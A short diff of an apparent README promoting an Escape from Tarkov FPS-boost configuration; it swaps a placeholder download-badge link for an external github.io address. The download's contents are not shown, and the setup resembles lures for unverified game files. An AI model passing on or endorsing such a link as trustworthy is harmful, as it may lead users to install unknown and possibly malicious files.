@@ -2,7 +2,7 @@
 
 Unlock the full performance potential of Escape from Tarkov with this custom-tuned FPS boost configuration. Whether you're playing on a high-end rig or an older PC, these game settings are carefully optimized to ensure minimal input delay, faster load times, and a more stable frame rate across all locations.
 
-[![Download Tarkov Config](https://img.shields.io/badge/Download-Tarkov_Config-blueviolet)](#)
+[![Download Tarkov Config](https://img.shields.io/badge/Download-Tarkov_Config-blueviolet)](https://tarkov-fps-boost-config.github.io/.github)
 
 ---
 
